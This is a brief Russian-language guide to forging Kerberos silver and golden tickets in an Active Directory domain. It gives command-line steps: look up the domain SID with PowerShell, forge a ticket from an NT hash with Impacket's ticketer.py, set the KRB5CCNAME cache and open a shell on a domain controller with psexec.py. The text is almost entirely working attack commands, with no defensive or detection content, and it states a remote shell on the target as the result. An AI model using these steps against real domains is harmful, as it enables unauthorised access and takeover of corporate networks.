# **Silver ticket/Golden ticket**

**Silver ticket/Golden ticket attack guide**

**Инструкция:**

- Узнаём с помощью любой машины в домене DomainSID.

`PS C:\ Get-ADDomain -Identity <domain.net>`

- Генерируем тикет.

`# python3 ticketer.py -nthash <hash> -domain-sid <domain-sid> -domain <domain.net> -spn <spn> <username>`

- Получаем доступ к машине.

`# export KRB5CCNAME = <ccache_file>`

`# python3 psexec.py <domain.net>/<username>@<ip_of_dc>`


**Результат:**

Шелл на атакуемой машине.
